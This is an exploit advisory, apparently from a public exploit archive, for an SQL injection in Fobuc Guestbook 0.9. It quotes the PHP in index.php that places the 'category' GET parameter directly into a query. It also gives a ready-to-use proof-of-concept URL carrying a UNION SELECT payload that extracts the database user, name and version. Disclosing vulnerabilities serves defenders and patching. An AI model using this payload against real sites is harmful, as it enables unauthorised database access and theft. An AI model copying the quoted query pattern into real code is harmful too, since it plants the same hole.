@@ -1,0 +1,60 @@
+# Exploit Title   : Fobuc Guestbook 0.9 SQL Injection
+# Date            : 11 June 2013
+# Exploit Author  : CWH Underground
+# Site            : www.2600.in.th
+# Vendor Homepage : http://sourceforge.net/projects/fobuc/
+# Software Link   : http://jaist.dl.sourceforge.net/project/fobuc/0.9/Release/FOBUC_0.9.zip
+# Version         : 0.9
+# Tested on       : Window and Linux
+  
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /        
+  / XXXXXX /
+ (________(          
+  `------'
+  
+##############################
+VULNERABILITY: SQL Injection 
+##############################
+  
+/index.php (LINE: 146-155)
+  
+-----------------------------------------------------------------------------
+LINE 146-149:
+ 
+$category_filter = $_GET['category'];
+$query = "SELECT * FROM comments WHERE approved = 1 AND category = '$category_filter' AND responding = 0 ORDER BY id LIMIT $start, $displayed_entries";
+$filter = 'category';
+$total_query = "SELECT * FROM comments WHERE approved = 1 AND category = '$category_filter' AND responding = 0";
+-----------------------------------------------------------------------------
+ 
+-----------------------------------------------------------------------------
+LINE 155:
+ 
+$total_comments = mysql_num_rows(mysql_query($total_query));
+-----------------------------------------------------------------------------
+      
+  
+#####################################################
+DESCRIPTION FOR SQL INJECTION
+#####################################################
+  
+An attacker might execute arbitrary SQL commands on the database server with this vulnerability.
+User tainted data is used when creating the database query that will be executed on the database management system (DBMS).
+An attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system
+depending on the query, DBMS and configuration.
+ 
+POC:
+ 
+http://target/fobuc/index.php?category=1%27%20and%201%20div%200%20union%20select%201,concat%28user%28%29,0x3a3a,database%28%29,0x3a3a,version%28%29%29,3,4,5,6,7,8,9,10--+
+  
+  
+################################################################################################################
+ Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+################################################################################################################
